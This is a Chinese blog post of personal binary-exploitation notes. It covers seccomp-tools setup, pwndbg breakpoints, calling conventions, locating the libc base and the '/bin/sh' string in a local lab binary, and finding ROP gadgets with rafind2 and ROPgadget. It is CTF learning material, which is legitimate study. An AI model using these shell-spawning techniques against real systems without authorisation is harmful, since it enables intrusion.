---
title: pwn备忘录
tags: pwn
abbrlink: 29112
date: 2018-06-08 09:46:21
---

## 硬中断和软中断

### 软中断

系统调用指令:

- 快速系统调用指令。32位系统使用sysenter指令，64位系统使用syscall指令。
- 软中断“int 0x80”机制，早期2.6内核及其以前的版本，才用软中断机制进行系统调用。因为软中断机制性能较差

### 硬中断:

由与系统相连的外设(比如网卡、硬盘)自动产生的。主要是用来通知操作系统系统外设状态的变化。比如当网卡收到数据包的时候，就会发出一个中断。我们通常所说的中断指的是硬中断(hardirq).

**Note: 一个软中断不会抢占另一个软中断，唯一可以抢占软中断的是硬中断。**

## 安装seccomp-tools

```
gem install seccomp-tools
```

如果报错:

```
ERROR:  Could not find a valid gem 'seccomp-tools' (>= 0), here is why:
          Unable to download data from https://gems.ruby-china.org/ - bad response Not Found 404 (https://gems.ruby-china.org/specs.4.8.gz)
```

参考链接: `https://blog.csdn.net/u011374880/article/details/82218802`

原因:

![](/assets/pwn/20180830113356496.png)

解决方法:

ruby的源

```
qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ gem source -l
*** CURRENT SOURCES ***

https://gems.ruby-china.org/
qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ gem sources --remove https://gems.ruby-china.org/
https://gems.ruby-china.org/ removed from sources
qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ gem sources --add https://gems.ruby-china.com/
https://gems.ruby-china.com/ added to sources
```

继续安装，再次报错:

```
Building native extensions.  This could take a while...
ERROR:  Error installing seccomp-tools:
	ERROR: Failed to build gem native extension.

    current directory: /var/lib/gems/2.3.0/gems/seccomp-tools-1.2.0/ext/ptrace
/usr/bin/ruby2.3 -r ./siteconf20181201-13842-4wr0lq.rb extconf.rb
mkmf.rb can't find header files for ruby at /usr/lib/ruby/include/ruby.h

extconf failed, exit code 1

Gem files will remain installed in /var/lib/gems/2.3.0/gems/seccomp-tools-1.2.0 for inspection.
Results logged to /var/lib/gems/2.3.0/extensions/x86_64-linux/2.3.0/seccomp-tools-1.2.0/gem_make.out
```

解决方法:

seccomp-tools应该依赖于ruby-dev,首先安装ruby-dev

```
sudo apt-get install ruby-dev
```

又报错:

```
qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ sudo apt-get install ruby-dev
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following additional packages will be installed:
  libgmp-dev libgmpxx4ldbl ruby2.3-dev
Suggested packages:
  gmp-doc libgmp10-doc libmpfr-dev
The following NEW packages will be installed:
  libgmp-dev libgmpxx4ldbl ruby-dev ruby2.3-dev
0 upgraded, 4 newly installed, 0 to remove and 24 not upgraded.
Need to get 1,361 kB of archives.
After this operation, 6,514 kB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://cn.archive.ubuntu.com/ubuntu xenial/main amd64 libgmpxx4ldbl amd64 2:6.1.0+dfsg-2 [8,948 B]
Get:2 http://cn.archive.ubuntu.com/ubuntu xenial/main amd64 libgmp-dev amd64 2:6.1.0+dfsg-2 [314 kB]
Err:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10
  404  Not Found [IP: 91.189.91.26 80]
Get:4 http://cn.archive.ubuntu.com/ubuntu xenial/main amd64 ruby-dev amd64 1:2.3.0+1 [4,408 B]
Err:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10
  404  Not Found [IP: 91.189.91.26 80]
Fetched 327 kB in 3s (88.7 kB/s)
E: Failed to fetch http://security.ubuntu.com/ubuntu/pool/main/r/ruby2.3/ruby2.3-dev_2.3.1-2~16.04.10_amd64.deb  404  Not Found [IP: 91.189.91.26 80]

E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?
```

加上--fix-missing,还是报错，哎:

```
sudo apt-get install ruby-dev

qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ sudo apt-get install ruby-dev --fix-missing
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following additional packages will be installed:
  libgmp-dev libgmpxx4ldbl ruby2.3-dev
Suggested packages:
  gmp-doc libgmp10-doc libmpfr-dev
The following NEW packages will be installed:
  libgmp-dev libgmpxx4ldbl ruby-dev ruby2.3-dev
0 upgraded, 4 newly installed, 0 to remove and 24 not upgraded.
Need to get 1,034 kB/1,361 kB of archives.
After this operation, 6,514 kB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Err:1 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10
  404  Not Found [IP: 91.189.91.26 80]
Err:1 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10
  404  Not Found [IP: 91.189.91.26 80]
Unable to correct missing packages.
E: Failed to fetch http://security.ubuntu.com/ubuntu/pool/main/r/ruby2.3/ruby2.3-dev_2.3.1-2~16.04.10_amd64.deb  404  Not Found [IP: 91.189.91.26 80]

E: Aborting install.

```

解决:

首先更新源:

```
sudo apt-get update
sudo apt-get install ruby-dev --fix-missing
sudo gem install seccomp-tools
```

ok.

## overlapping方法

* how2heap_overlapping_chunk

参考 how2heap-分析总结

* how2heap_overlapping_chunk_2

参考 how2heap-分析总结

* lctf_easy_heap_tcache

通过unlink进行overlapping。

参考tcache_study

* hitcon2018_children_tcache

参考tcache_study

## pwngdb 打断点

遇到开启了pie的程序，可以通过以下方式打断点:

```
b *$rebase(偏移)
```

比如:

```
.text:0000000000000959 loc_959:                                ; CODE XREF: main+57↑j
.text:0000000000000959                 cmp     [rbp+var_C], 4
.text:000000000000095D                 jle     short loc_929
.text:000000000000095F                 mov     edi, 539h       ; status
.text:0000000000000964                 call    exit
.text:0000000000000964 ; } // starts at 8D0
```

在exit打断点,可以这样:

```
b *$rebase(0x964)
```

## 调用约定

* arm32函数调用约定
  arm32位调用约定采用ATPCS。
  参数1~参数4 分别保存到 R0~R3 寄存器中 ，剩下的参数从右往左一次入栈，被调用者实现栈平衡，返回值存放在 R0 中。

* arm64函数调用约定
  arm64位调用约定采用AAPCS64。参数1~参数8 分别保存到 X0~X7 寄存器中 ，剩下的参数从右往左一次入栈，被调用者实现栈平衡，返回值存放在 X0 中。

* 32位x86:

* 64位x64

32位和64位程序的区别, 更多的是体现在[调用约定(Calling Convention)](https://en.wikipedia.org/wiki/X86_calling_conventions)上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.

本文主要是介绍Linux平台下的漏洞利用, 所以就专注于`System V AMD64 ABI` 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.

```
$ cat victim.c
int foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) {
    return a + b + c + d + e + f + g + h;
}
int main() {
    foo(1, 2, 3, 4, 5, 6, 7, 8);
    return 0;
}
$ gcc victim.c -o victim
$ objdump -d victim | grep "<main>:" -A 11
00000000000006a0 <main>:
 6a0:   55                      push   rbp
 6a1:   48 89 e5                mov    rbp,rsp
 6a4:   6a 08                   push   0x8
 6a6:   6a 07                   push   0x7
 6a8:   41 b9 06 00 00 00       mov    r9d,0x6
 6ae:   41 b8 05 00 00 00       mov    r8d,0x5
 6b4:   b9 04 00 00 00          mov    ecx,0x4
 6b9:   ba 03 00 00 00          mov    edx,0x3
 6be:   be 02 00 00 00          mov    esi,0x2
 6c3:   bf 01 00 00 00          mov    edi,0x1
 6c8:   e8 93 ff ff ff          call   660 <foo>
```

## 查找libc基地址

方法一:

```
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln
	linux-vdso.so.1 (0x00007ffff7ffa000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)
```

方法二:

首先查找libc中某一函数的偏移，以system为例:

```
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@
   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

或者使用ida也可以查找函数的偏移。

寻找system的绝对地址：

```
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln
Catchpoint 1 (exec)
Reading symbols from vuln...done.
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x5d0 <system@plt>
gdb-peda$ r
Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln 
asdf
asdf

[Inferior 1 (process 7107) exited normally]
Warning: not running or target is remote
gdb-peda$ p system
$2 = {int (const char *)} 0x7ffff7a33440 <__libc_system>
```

然后就可以计算libc的基地址:

>  0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000

## 查找"/bin/sh"的偏移地址

方法一:

```
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6
0x1b3e9a
```

方法二:

在ida中查找。

方法三:

在环境变量中查找。

```shell
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln
Catchpoint 1 (exec)
Reading symbols from vuln...done.
gdb-peda$ b *main
Breakpoint 2 at 0x555555554739: file vuln.c, line 17.
gdb-peda$ r
Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln 

[----------------------------------registers-----------------------------------]
RAX: 0x555555554739 (<main>:	push   rbp)
RBX: 0x0 
RCX: 0x555555554790 (<__libc_csu_init>:	push   r15)
RDX: 0x7fffffffddf8 --> 0x7fffffffe1c7 ("CLUTTER_IM_MODULE=xim")
RSI: 0x7fffffffdde8 --> 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
RDI: 0x1 
RBP: 0x555555554790 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
RIP: 0x555555554739 (<main>:	push   rbp)
R8 : 0x7ffff7dd0d80 --> 0x0 
R9 : 0x7ffff7dd0d80 --> 0x0 
R10: 0x0 
R11: 0x1 
R12: 0x555555554610 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdde0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55555555472a <shell+16>:	call   0x5555555545d0 <system@plt>
   0x55555555472f <shell+21>:	mov    edi,0x0
   0x555555554734 <shell+26>:	call   0x5555555545f0 <exit@plt>
=> 0x555555554739 <main>:	push   rbp
   0x55555555473a <main+1>:	mov    rbp,rsp
   0x55555555473d <main+4>:	sub    rsp,0x120
   0x555555554744 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x55555555474a <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0008| 0x7fffffffdd10 --> 0x1 
0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
0024| 0x7fffffffdd20 --> 0x100008000 
0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:	push   rbp)
0040| 0x7fffffffdd30 --> 0x0 
0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be 
0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17
warning: Source file is more recent than executable.
17	int main(int argc, char* argv[]) {
gdb-peda$ telescope 100
0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0008| 0x7fffffffdd10 --> 0x1 
0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
0024| 0x7fffffffdd20 --> 0x100008000 
0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:	push   rbp)
0040| 0x7fffffffdd30 --> 0x0 
0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be 
0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
0064| 0x7fffffffdd48 --> 0x7fffffffdde0 --> 0x1 
0072| 0x7fffffffdd50 --> 0x0 
0080| 0x7fffffffdd58 --> 0x0 
0088| 0x7fffffffdd60 --> 0xe8ddf05985fd83be 
0096| 0x7fffffffdd68 --> 0xe8dde0e6894383be 
0104| 0x7fffffffdd70 --> 0x7fff00000000 
0112| 0x7fffffffdd78 --> 0x0 
0120| 0x7fffffffdd80 --> 0x0 
0128| 0x7fffffffdd88 --> 0x7ffff7de5733 (<_dl_init+259>:	add    r14,0x8)
0136| 0x7fffffffdd90 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 
0144| 0x7fffffffdd98 --> 0x2225ab63 
0152| 0x7fffffffdda0 --> 0x0 
0160| 0x7fffffffdda8 --> 0x0 
0168| 0x7fffffffddb0 --> 0x0 
0176| 0x7fffffffddb8 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
0184| 0x7fffffffddc0 --> 0x7fffffffdde0 --> 0x1 
0192| 0x7fffffffddc8 --> 0x55555555463a (<_start+42>:	hlt)
--More--(25/100)
0200| 0x7fffffffddd0 --> 0x7fffffffddd8 --> 0x1c 
0208| 0x7fffffffddd8 --> 0x1c 
0216| 0x7fffffffdde0 --> 0x1 
0224| 0x7fffffffdde8 --> 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
0232| 0x7fffffffddf0 --> 0x0 
0240| 0x7fffffffddf8 --> 0x7fffffffe1c7 ("CLUTTER_IM_MODULE=xim")
0248| 0x7fffffffde00 --> 0x7fffffffe1dd ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0256| 0x7fffffffde08 --> 0x7fffffffe7c9 ("LC_MEASUREMENT=zh_CN.UTF-8")
0264| 0x7fffffffde10 --> 0x7fffffffe7e4 ("LESSCLOSE=/usr/bin/lesspipe %s %s")
0272| 0x7fffffffde18 --> 0x7fffffffe806 ("LC_PAPER=zh_CN.UTF-8")
0280| 0x7fffffffde20 --> 0x7fffffffe81b ("LC_MONETARY=zh_CN.UTF-8")
0288| 0x7fffffffde28 --> 0x7fffffffe833 ("XDG_MENU_PREFIX=gnome-")
0296| 0x7fffffffde30 --> 0x7fffffffe84a ("_=/usr/bin/gdb")
0304| 0x7fffffffde38 --> 0x7fffffffe859 ("LANG=en_US.UTF-8")
0312| 0x7fffffffde40 --> 0x7fffffffe86a ("DISPLAY=:0")
0320| 0x7fffffffde48 --> 0x7fffffffe875 ("OLDPWD=/home/tianji/Desktop/sploit")
0328| 0x7fffffffde50 --> 0x7fffffffe898 ("GNOME_SHELL_SESSION_MODE=ubuntu")
0336| 0x7fffffffde58 --> 0x7fffffffe8b8 ("COLORTERM=truecolor")
0344| 0x7fffffffde60 --> 0x7fffffffe8cc ("USERNAME=tianji")
0352| 0x7fffffffde68 --> 0x7fffffffe8dc ("XDG_VTNR=1")
0360| 0x7fffffffde70 --> 0x7fffffffe8e7 ("SSH_AUTH_SOCK=/run/user/1000/keyring/ssh")
0368| 0x7fffffffde78 --> 0x7fffffffe910 ("MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path")
0376| 0x7fffffffde80 --> 0x7fffffffe946 ("LC_NAME=zh_CN.UTF-8")
0384| 0x7fffffffde88 --> 0x7fffffffe95a ("XDG_SESSION_ID=1")
0392| 0x7fffffffde90 --> 0x7fffffffe96b ("USER=tianji")
--More--(50/100)
0400| 0x7fffffffde98 --> 0x7fffffffe977 ("DESKTOP_SESSION=ubuntu")
0408| 0x7fffffffdea0 --> 0x7fffffffe98e ("QT4_IM_MODULE=fcitx")
0416| 0x7fffffffdea8 --> 0x7fffffffe9a2 ("TEXTDOMAINDIR=/usr/share/locale/")
0424| 0x7fffffffdeb0 --> 0x7fffffffe9c3 ("GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa")
0432| 0x7fffffffdeb8 --> 0x7fffffffea19 ("DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path")
0440| 0x7fffffffdec0 --> 0x7fffffffea4c ("PWD=/home/tianji/Desktop/sploit/bypassaslr_1")
0448| 0x7fffffffdec8 --> 0x7fffffffea79 ("LINES=24")
0456| 0x7fffffffded0 --> 0x7fffffffea82 ("HOME=/home/tianji")
0464| 0x7fffffffded8 --> 0x7fffffffea94 ("TEXTDOMAIN=im-config")
0472| 0x7fffffffdee0 --> 0x7fffffffeaa9 ("SSH_AGENT_PID=1606")
0480| 0x7fffffffdee8 --> 0x7fffffffeabc ("QT_ACCESSIBILITY=1")
0488| 0x7fffffffdef0 --> 0x7fffffffeacf ("XDG_SESSION_TYPE=x11")
0496| 0x7fffffffdef8 --> 0x7fffffffeae4 ("XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop")
0504| 0x7fffffffdf00 --> 0x7fffffffeb37 ("XDG_SESSION_DESKTOP=ubuntu")
0512| 0x7fffffffdf08 --> 0x7fffffffeb52 ("LC_ADDRESS=zh_CN.UTF-8")
0520| 0x7fffffffdf10 --> 0x7fffffffeb69 ("GJS_DEBUG_OUTPUT=stderr")
0528| 0x7fffffffdf18 --> 0x7fffffffeb81 ("LC_NUMERIC=zh_CN.UTF-8")
0536| 0x7fffffffdf20 --> 0x7fffffffeb98 ("ALL_PROXY=socks://127.0.0.1:1080/")
0544| 0x7fffffffdf28 --> 0x7fffffffebba ("no_proxy=localhost,127.0.0.0/8,::1")
0552| 0x7fffffffdf30 --> 0x7fffffffebdd ("GTK_MODULES=gail:atk-bridge")
0560| 0x7fffffffdf38 --> 0x7fffffffebf9 ("NO_PROXY=localhost,127.0.0.0/8,::1")
0568| 0x7fffffffdf40 --> 0x7fffffffec1c ("COLUMNS=79")
0576| 0x7fffffffdf48 --> 0x7fffffffec27 ("WINDOWPATH=1")
0584| 0x7fffffffdf50 --> 0x7fffffffec34 ("SHELL=/bin/bash")
0592| 0x7fffffffdf58 --> 0x7fffffffec44 ("VTE_VERSION=5201")
```

我们可以看到“SHELL=/bin/bash”的地址:`0x7fffffffec34`,然后去掉`SHELL`,这样“/bin/bash”的地址就是`0x7fffffffec3a`

```
gdb-peda$ x/s 0x7fffffffec3a
0x7fffffffec3a:	"/bin/bash"
```

当然，我这里是"/bin/bash",所以这方法不可行。这时候，可以添加环境变量。

```
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln
Catchpoint 1 (exec)
Reading symbols from vuln...done.
gdb-peda$ b *main
Breakpoint 2 at 0x739: file vuln.c, line 17.
gdb-peda$ r
Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln 

[----------------------------------registers-----------------------------------]
RAX: 0x555555554739 (<main>:	push   rbp)
RBX: 0x0 
RCX: 0x555555554790 (<__libc_csu_init>:	push   r15)
RDX: 0x7fffffffdde8 --> 0x7fffffffe1bb ("CLUTTER_IM_MODULE=xim")
RSI: 0x7fffffffddd8 --> 0x7fffffffe18d ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
RDI: 0x1 
RBP: 0x555555554790 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
RIP: 0x555555554739 (<main>:	push   rbp)
R8 : 0x7ffff7dd0d80 --> 0x0 
R9 : 0x7ffff7dd0d80 --> 0x0 
R10: 0x0 
R11: 0x1 
R12: 0x555555554610 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffddd0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55555555472a <shell+16>:	call   0x5555555545d0 <system@plt>
   0x55555555472f <shell+21>:	mov    edi,0x0
   0x555555554734 <shell+26>:	call   0x5555555545f0 <exit@plt>
=> 0x555555554739 <main>:	push   rbp
   0x55555555473a <main+1>:	mov    rbp,rsp
   0x55555555473d <main+4>:	sub    rsp,0x120
   0x555555554744 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x55555555474a <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0008| 0x7fffffffdd00 --> 0x1 
0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
0024| 0x7fffffffdd10 --> 0x100008000 
0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:	push   rbp)
0040| 0x7fffffffdd20 --> 0x0 
0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d 
0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17
warning: Source file is more recent than executable.
17	int main(int argc, char* argv[]) {
gdb-peda$ telescope 200
0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0008| 0x7fffffffdd00 --> 0x1 
0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
0024| 0x7fffffffdd10 --> 0x100008000 
0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:	push   rbp)
0040| 0x7fffffffdd20 --> 0x0 
0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d 
0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
0064| 0x7fffffffdd38 --> 0x7fffffffddd0 --> 0x1 
0072| 0x7fffffffdd40 --> 0x0 
0080| 0x7fffffffdd48 --> 0x0 
0088| 0x7fffffffdd50 --> 0x3e3e2b88b8ee246d 
0096| 0x7fffffffdd58 --> 0x3e3e3b37b470246d 
0104| 0x7fffffffdd60 --> 0x7fff00000000 
0112| 0x7fffffffdd68 --> 0x0 
0120| 0x7fffffffdd70 --> 0x0 
0128| 0x7fffffffdd78 --> 0x7ffff7de5733 (<_dl_init+259>:	add    r14,0x8)
0136| 0x7fffffffdd80 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 
0144| 0x7fffffffdd88 --> 0x22bf66c6 
0152| 0x7fffffffdd90 --> 0x0 
0160| 0x7fffffffdd98 --> 0x0 
0168| 0x7fffffffdda0 --> 0x0 
0176| 0x7fffffffdda8 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
0184| 0x7fffffffddb0 --> 0x7fffffffddd0 --> 0x1 
0192| 0x7fffffffddb8 --> 0x55555555463a (<_start+42>:	hlt)
--More--(25/200)
0200| 0x7fffffffddc0 --> 0x7fffffffddc8 --> 0x1c 
0208| 0x7fffffffddc8 --> 0x1c 
0216| 0x7fffffffddd0 --> 0x1 
0224| 0x7fffffffddd8 --> 0x7fffffffe18d ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
0232| 0x7fffffffdde0 --> 0x0 
0240| 0x7fffffffdde8 --> 0x7fffffffe1bb ("CLUTTER_IM_MODULE=xim")
0248| 0x7fffffffddf0 --> 0x7fffffffe1d1 ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0256| 0x7fffffffddf8 --> 0x7fffffffe7bd ("LC_MEASUREMENT=zh_CN.UTF-8")
0264| 0x7fffffffde00 --> 0x7fffffffe7d8 ("LESSCLOSE=/usr/bin/lesspipe %s %s")
0272| 0x7fffffffde08 --> 0x7fffffffe7fa ("LC_PAPER=zh_CN.UTF-8")
0280| 0x7fffffffde10 --> 0x7fffffffe80f ("LC_MONETARY=zh_CN.UTF-8")
0288| 0x7fffffffde18 --> 0x7fffffffe827 ("XDG_MENU_PREFIX=gnome-")
0296| 0x7fffffffde20 --> 0x7fffffffe83e ("_=/usr/bin/gdb")
0304| 0x7fffffffde28 --> 0x7fffffffe84d ("LANG=en_US.UTF-8")
0312| 0x7fffffffde30 --> 0x7fffffffe85e ("DISPLAY=:0")
0320| 0x7fffffffde38 --> 0x7fffffffe869 ("ABC=/bin/sh")
0328| 0x7fffffffde40 --> 0x7fffffffe875 ("OLDPWD=/home/tianji/Desktop/sploit")
0336| 0x7fffffffde48 --> 0x7fffffffe898 ("GNOME_SHELL_SESSION_MODE=ubuntu")
0344| 0x7fffffffde50 --> 0x7fffffffe8b8 ("COLORTERM=truecolor")
0352| 0x7fffffffde58 --> 0x7fffffffe8cc ("USERNAME=tianji")
0360| 0x7fffffffde60 --> 0x7fffffffe8dc ("XDG_VTNR=1")
0368| 0x7fffffffde68 --> 0x7fffffffe8e7 ("SSH_AUTH_SOCK=/run/user/1000/keyring/ssh")
0376| 0x7fffffffde70 --> 0x7fffffffe910 ("MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path")
0384| 0x7fffffffde78 --> 0x7fffffffe946 ("LC_NAME=zh_CN.UTF-8")
0392| 0x7fffffffde80 --> 0x7fffffffe95a ("XDG_SESSION_ID=1")
```

可以看到"/bin/sh"的地址：`0x7fffffffe869 + 0x6 = 0x7fffffffe86e`。

```
gdb-peda$ x/s 0x7fffffffe86e
0x7fffffffe86e:	"bin/sh"
```

当然，这个方法仅限本地使用。

## 反汇编代码

```
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 "jmp rsp"
ffe4
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 "pop rdi; ret"
5fc3
tianji@tianji-machine:~/Desktop/sploit/heap/unlink$ disasm "5fc3"
   0:    5f                       pop    edi
   1:    c3                       ret
```
## 在可执行文件中找gadget

方法一:

```
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln
0x7f3
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............
0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........
0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..
0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................
0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\....
```

可以看到5fc3的偏移位置就是: '0x7f3'

方法二:

```
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all
Gadgets information
============================================================
0x0000000000000707 : add bl, dh ; ret
0x00000000000007ff : add bl, dh ; ret
0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000000788 : add byte ptr [rax], al ; leave ; ret
0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret
0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000000706 : add byte ptr [rax], al ; ret
0x00000000000007fe : add byte ptr [rax], al ; ret
0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000000789 : add cl, cl ; ret
0x00000000000005a3 : add esp, 8 ; ret
0x0000000000000809 : add esp, 8 ; ret
0x00000000000005a2 : add rsp, 8 ; ret
0x0000000000000808 : add rsp, 8 ; ret
0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax
0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax
0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax
0x00000000000007d9 : call qword ptr [r12 + rbx*8]
0x00000000000007da : call qword ptr [rsp + rbx*8]
0x00000000000005a0 : call rax
0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret
0x000000000000059e : je 0x5a4 ; call rax
